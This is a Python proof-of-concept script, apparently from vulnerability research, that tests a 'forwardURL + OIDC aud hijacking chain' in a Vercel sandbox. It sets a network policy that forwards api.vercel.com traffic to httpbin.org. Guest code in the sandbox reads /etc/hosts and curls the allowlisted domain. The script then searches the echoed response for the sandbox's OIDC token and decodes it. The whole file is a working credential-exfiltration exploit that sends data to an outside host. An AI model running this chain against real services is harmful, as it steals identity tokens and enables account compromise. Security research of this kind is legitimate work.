# -*- coding: utf-8 -*-
"""Phase3d: forwardURL + OIDC aud 劫持链测试
配置: allowedDomains=[api.vercel.com] + forwardURL=httpbin.org/anything
沙箱内访问 api.vercel.com -> 防火墙转发到 httpbin -> echo 显示附加的 OIDC token
"""
import sys, json, base64, time
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_6M8Yg7kJadsCnQ8GlDyTeZJa6VaY"

GUEST = r'''
import subprocess
# /etc/hosts
try:
    print('--- /etc/hosts ---', flush=True)
    print(open('/etc/hosts').read(), flush=True)
except Exception as e:
    print('hosts ERR', e, flush=True)
# curl api.vercel.com (will be forwarded to httpbin by firewall)
r = subprocess.run(['curl', '-s', '-m', '15', '-k', 'https://api.vercel.com/anything'], capture_output=True, text=True)
print('CURL OUT:', r.stdout[:3000], flush=True)
print('CURL ERR:', r.stderr[:500], flush=True)
print('done', flush=True)
'''

code = "cat > /tmp/pg6.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg6.py"


def decode_jwt(tok):
    try:
        parts = tok.split('.')
        if len(parts) < 2:
            return None
        payload = parts[1]
        payload += '=' * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except Exception as e:
        return {'err': str(e)}


if __name__ == "__main__":
    # 1. 配置旧格式 allow 规则(不带 mode): api.vercel.com 白名单 + forwardURL -> httpbin
    body = {
        "allow": {
            "api.vercel.com": [
                {"match": {"path": {"startsWith": "/"}}, "forwardURL": "https://httpbin.org/anything"}
            ]
        }
    }
    c, r = api("POST", "/v2/sandboxes/sessions/%s/network-policy?teamId=%s" % (SID, TEAM), body)
    print('set policy:', c, r[:400], flush=True)
    time.sleep(2)

    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=60000)
    print('cmd:', c, flush=True)
    txt = r
    print(txt[:5000], flush=True)

    # 2. 提取 token 并解码 aud
    import re
    for m in re.finditer(r'vercel-sandbox-oidc-token[":\s]+([A-Za-z0-9_\-\.]+)', txt):
        tok = m.group(1)
        print('TOKEN FOUND len=%d' % len(tok), flush=True)
        print('PAYLOAD:', json.dumps(decode_jwt(tok), indent=1), flush=True)
        break
    else:
        print('no token in response', flush=True)
